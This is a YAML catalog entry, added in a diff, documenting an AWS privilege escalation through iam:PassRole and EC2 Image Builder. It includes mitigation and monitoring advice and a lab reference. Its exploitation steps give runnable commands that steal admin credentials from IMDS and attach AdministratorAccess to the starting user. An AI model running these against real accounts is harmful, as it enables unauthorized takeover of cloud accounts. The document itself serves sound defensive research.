@@ -1,0 +1,304 @@
+id: imagebuilder-001
+name: iam:PassRole + imagebuilder:CreateComponent + imagebuilder:CreateImageRecipe + imagebuilder:CreateInfrastructureConfiguration + imagebuilder:CreateImage
+category: new-passrole
+services:
+  - iam
+  - imagebuilder
+  - ec2
+
+permissions:
+  required:
+    - permission: iam:PassRole
+      resourceConstraints: Must be able to pass the target admin IAM instance profile role to the EC2 Image Builder service
+    - permission: imagebuilder:CreateComponent
+      resourceConstraints: No resource constraints required
+    - permission: imagebuilder:CreateImageRecipe
+      resourceConstraints: No resource constraints required
+    - permission: imagebuilder:CreateInfrastructureConfiguration
+      resourceConstraints: No resource constraints required; this step contains the iam:PassRole of the instance profile
+    - permission: imagebuilder:CreateImage
+      resourceConstraints: No resource constraints required
+  additional:
+    - permission: imagebuilder:GetComponent
+      resourceConstraints: Useful for verifying component creation
+    - permission: imagebuilder:GetImage
+      resourceConstraints: Useful for polling image build status
+    - permission: imagebuilder:GetImageRecipe
+      resourceConstraints: Useful for verifying recipe configuration
+    - permission: imagebuilder:GetInfrastructureConfiguration
+      resourceConstraints: Useful for verifying infrastructure configuration
+    - permission: imagebuilder:TagResource
+      resourceConstraints: Required in some regions or configurations
+    - permission: ec2:DescribeImages
+      resourceConstraints: Useful for finding the base AMI to use in the image recipe
+    - permission: imagebuilder:ListImages
+      resourceConstraints: Helpful for discovering existing images and their build status
+    - permission: iam:ListAttachedUserPolicies
+      resourceConstraints: Useful for verifying privilege escalation success
+
+description: >-
+  A principal with `iam:PassRole` and EC2 Image Builder creation permissions can escalate privileges by building a multi-step pipeline
+  (creating a component containing malicious shell commands, adding it to an image recipe, creating an infrastructure configuration that
+  passes an admin IAM instance profile, then triggering an image build). The Image Builder agent (SSM) runs the component's shell commands
+  on an EC2 build instance that has the admin instance profile attached, giving the commands access to admin credentials via IMDS.
+  The commands call `iam:AttachUserPolicy` to attach AdministratorAccess to the starting user.
+
+prerequisites:
+  admin:
+    - A role must exist that can be used as an EC2 instance profile (trusts ec2.amazonaws.com)
+    - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
+    - The AWS Image Builder service-linked role (AWSServiceRoleForImageBuilder) must exist in the account
+    - The EC2ImageBuilderLifecycleAccessPolicy policy or equivalent must be attached to the instance profile role
+  lateral:
+    - A role must exist that can be used as an EC2 instance profile and has elevated permissions
+    - The AWSServiceRoleForImageBuilder SLR must exist in the account
+
+exploitationSteps:
+  awscli:
+    - step: 1
+      command: |
+        cat > /tmp/imagebuilder-component.yaml << 'EOF'
+        name: privesc-component
+        description: Privilege escalation component
+        schemaVersion: 1.0
+        phases:
+          - name: build
+            steps:
+              - name: Exploit
+                action: ExecuteBash
+                inputs:
+                  commands:
+                    - |
+                      TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+                        -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+                      ROLE_CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+                        http://169.254.169.254/latest/meta-data/iam/security-credentials/ADMIN_ROLE)
+                      export AWS_ACCESS_KEY_ID=$(echo $ROLE_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['AccessKeyId'])")
+                      export AWS_SECRET_ACCESS_KEY=$(echo $ROLE_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['SecretAccessKey'])")
+                      export AWS_SESSION_TOKEN=$(echo $ROLE_CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Token'])")
+                      aws iam attach-user-policy \
+                        --user-name STARTING_USER \
+                        --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+        EOF
+
+        aws imagebuilder create-component \
+          --name privesc-component \
+          --semantic-version 1.0.0 \
+          --platform Linux \
+          --data file:///tmp/imagebuilder-component.yaml
+      description: Create a malicious Image Builder component containing shell commands that retrieve admin credentials from IMDS and call iam:AttachUserPolicy to escalate privileges.
+    - step: 2
+      command: |
+        BASE_AMI=$(aws ssm get-parameter \
+          --name /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64 \
+          --query 'Parameter.Value' \
+          --output text)
+
+        aws imagebuilder create-image-recipe \
+          --name privesc-recipe \
+          --semantic-version 1.0.0 \
+          --parent-image $BASE_AMI \
+          --components componentArn=COMPONENT_ARN
+      description: Create an image recipe that incorporates the malicious component, using the latest Amazon Linux 2023 AMI as the base image.
+    - step: 3
+      command: |
+        aws imagebuilder create-infrastructure-configuration \
+          --name privesc-infra-config \
+          --instance-profile-name ADMIN_INSTANCE_PROFILE \
+          --instance-types t3.medium
+      description: Create an infrastructure configuration passing the admin instance profile. This is the iam:PassRole step — the instance profile role will be attached to the EC2 build instance.
+    - step: 4
+      command: |
+        aws imagebuilder create-image \
+          --image-recipe-arn RECIPE_ARN \
+          --infrastructure-configuration-arn INFRA_CONFIG_ARN
+      description: Trigger the image build. Image Builder provisions an EC2 instance with the admin instance profile, runs the component shell commands, and the commands escalate privileges. The build typically takes 10-20 minutes.
+
+recommendation: |
+  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.
+
+  - **Avoid administrative EC2 Image Builder instance profiles** - Build instances rarely need administrative access. Scope instance profiles to only the S3 buckets and services required for the build process.
+  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services. Use IAM policy conditions to restrict which roles can be passed and to which services:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificImageBuilderRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "ec2.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  - **Restrict Image Builder creation permissions** - Treat `imagebuilder:CreateComponent`, `imagebuilder:CreateImageRecipe`, `imagebuilder:CreateInfrastructureConfiguration`, and `imagebuilder:CreateImage` as privileged permissions. All four together form a complete attack chain.
+  - Monitor CloudTrail for unusual Image Builder component creation with shell commands that access IMDS or call IAM APIs
+  - Monitor CloudTrail for image builds triggered by principals who do not usually build images
+  - Monitor CloudTrail for infrastructure configurations referencing privileged instance profiles
+  - Alert on IAM policy attachment events originating from EC2 instances running Image Builder builds
+  - Regularly audit Image Builder infrastructure configurations for excessive IAM permissions on instance profiles
+
+limitations: |
+  This path provides administrative access only if the passed instance profile role has administrative permissions (e.g., AdministratorAccess or an equivalent custom policy). If only limited roles are available to pass, the attacker gains access limited to those role permissions. Image builds typically take 10-20 minutes to complete, making this a slower escalation path. The `ssm:GetParameter` permission must not be in the starting user's helpful permissions set, as it is used by the flag-capture step and would be denied by the restriction policy.
+
+discoveryAttribution:
+  firstDocumented:
+    author: Zander Mackie
+    organization: Datadog
+    date: "2025"
+
+references:
+  - title: "Actions defined by EC2 Image Builder - Service Authorization Reference"
+    url: "https://docs.aws.amazon.com/service-authorization/latest/reference/list_amazonec2imagebuilder.html"
+  - title: "Security best practices in EC2 Image Builder - EC2 Image Builder"
+    url: "https://docs.aws.amazon.com/imagebuilder/latest/userguide/security-best-practices.html"
+
+learningEnvironments:
+  pathfinding-labs:
+    type: open-source
+    githubLink: https://github.com/DataDog/pathfinding-labs
+    scenario: "privesc-one-hop/to-admin/imagebuilder-001-iam-passrole+imagebuilder-createcomponent+imagebuilder-createimagerecipe+imagebuilder-createinfrastructureconfiguration+imagebuilder-createimage"
+    description: "Deploy Terraform scenarios individually or in groups, each with attack and cleanup scripts"
+
+attackVisualization:
+  nodes:
+    - id: start
+      label: Starting Principal
+      type: principal
+      description: The principal with `iam:PassRole` and EC2 Image Builder creation permissions. Can be an IAM user or role.
+
+    - id: component
+      label: Malicious Build Component
+      type: resource
+      description: |
+        A new EC2 Image Builder component created by the attacker containing malicious shell commands. The component uses the `ExecuteBash` action to run commands during the build phase. The commands retrieve the admin instance profile credentials from IMDS and call `iam:AttachUserPolicy` to escalate the starting principal's privileges.
+
+        Component definition:
+        ```bash
+        aws imagebuilder create-component \
+          --name privesc-component \
+          --semantic-version 1.0.0 \
+          --platform Linux \
+          --data file:///tmp/imagebuilder-component.yaml
+        ```
+
+    - id: infra_config
+      label: Infrastructure Configuration
+      type: resource
+      description: |
+        A new EC2 Image Builder infrastructure configuration created by the attacker. This is the step where `iam:PassRole` occurs — the attacker passes an admin IAM instance profile to this configuration, which Image Builder will attach to the EC2 build instance.
+
+        Command:
+        ```bash
+        aws imagebuilder create-infrastructure-configuration \
+          --name privesc-infra-config \
+          --instance-profile-name ADMIN_INSTANCE_PROFILE \
+          --instance-types t3.medium
+        ```
+
+    - id: ec2_build
+      label: EC2 Build Instance
+      type: resource
+      description: An EC2 instance provisioned by the EC2 Image Builder service to execute the image build. The instance has the admin instance profile attached (passed via the infrastructure configuration), making the admin role's temporary credentials available via IMDS at http://169.254.169.254/latest/meta-data/iam/security-credentials/. The Image Builder agent (SSM) runs the component shell commands on this instance.
+
+    - id: admin_role
+      label: Admin Instance Profile Role
+      type: principal
+      description: The IAM role attached to the EC2 build instance via the instance profile. The role must trust `ec2.amazonaws.com` and have an instance profile associated with it. The role's temporary credentials are available via IMDS and are used by the malicious component shell commands to call `iam:AttachUserPolicy` and escalate the starting principal's privileges.
+
+    - id: admin
+      label: Effective Administrator
+      type: outcome
+      description: The admin instance profile role has AdministratorAccess or equivalent permissions. The malicious build component shell commands successfully call `iam:AttachUserPolicy` using the instance role credentials, granting the starting principal full administrative access to the AWS account.
+
+    - id: some_perms
+      label: Some additional access
+      type: outcome
+      color: '#ffeb99'
+      description: The instance profile role has some elevated permissions but not full admin access. The build component commands can leverage those permissions for data access, security configuration changes, or additional privilege escalation paths, but cannot directly attach AdministratorAccess to the starting principal.
+
+    - id: no_access
+      label: No additional access
+      type: outcome
+      color: '#cccccc'
+      description: The instance profile role only has minimal permissions (e.g., permissions scoped to S3 buckets or Image Builder artifacts). The malicious build commands execute but provide limited privilege escalation value.
+
+  edges:
+    - from: start
+      to: component
+      label: imagebuilder:CreateComponent
+      description: |
+        Create a malicious Image Builder component containing shell commands that retrieve admin credentials from IMDS and call `iam:AttachUserPolicy`.
+
+        Command:
+        ```bash
+        aws imagebuilder create-component \
+          --name privesc-component \
+          --semantic-version 1.0.0 \
+          --platform Linux \
+          --data file:///tmp/imagebuilder-component.yaml
+        ```
+
+    - from: start
+      to: infra_config
+      label: iam:PassRole + imagebuilder:CreateInfrastructureConfiguration
+      description: |
+        Create an infrastructure configuration that passes the admin instance profile to Image Builder. This is the `iam:PassRole` step — the admin IAM role is embedded in the infrastructure configuration and will be attached to the EC2 build instance.
+
+        Command:
+        ```bash
+        aws imagebuilder create-infrastructure-configuration \
+          --name privesc-infra-config \
+          --instance-profile-name ADMIN_INSTANCE_PROFILE \
+          --instance-types t3.medium
+        ```
+
+    - from: start
+      to: ec2_build
+      label: imagebuilder:CreateImageRecipe + imagebuilder:CreateImage
+      description: |
+        Create an image recipe combining the malicious component with a base AMI, then trigger the image build. Image Builder provisions an EC2 instance with the admin instance profile and runs the component commands. Builds typically take 10-20 minutes to complete.
+
+        Step 1 — Create the recipe:
+        ```bash
+        aws imagebuilder create-image-recipe \
+          --name privesc-recipe \
+          --semantic-version 1.0.0 \
+          --parent-image $BASE_AMI \
+          --components componentArn=COMPONENT_ARN
+        ```
+
+        Step 2 — Trigger the build:
+        ```bash
+        aws imagebuilder create-image \
+          --image-recipe-arn RECIPE_ARN \
+          --infrastructure-configuration-arn INFRA_CONFIG_ARN
+        ```
+
+    - from: ec2_build
+      to: admin_role
+      label: Build instance accesses role via IMDS
+      description: The EC2 build instance automatically assumes the admin instance profile role attached via the infrastructure configuration. The Image Builder agent (SSM) runs the malicious component shell commands on the instance, which retrieve the role's temporary credentials from IMDS at `http://169.254.169.254/latest/meta-data/iam/security-credentials/ADMIN_ROLE`.
+
+    - from: admin_role
+      to: admin
+      label: If role has admin permissions
+      branch: A
+      condition: admin
+      description: If the instance profile role has AdministratorAccess or IAM write permissions, the component shell commands successfully call `iam:AttachUserPolicy` using those credentials, granting the starting principal full administrative access.
+
+    - from: admin_role
+      to: some_perms
+      label: If role has some elevated permissions
+      branch: B
+      condition: some_permissions
+      description: If the instance profile role has some elevated permissions but not IAM write access, the build commands can leverage those permissions for data access or reconnaissance but cannot directly elevate the starting principal via IAM modifications.
+
+    - from: admin_role
+      to: no_access
+      label: If role has minimal permissions
+      branch: C
+      condition: no_permissions
+      description: If the instance profile role only has minimal permissions scoped to Image Builder or S3 artifacts, the malicious component commands execute but provide limited privilege escalation value.
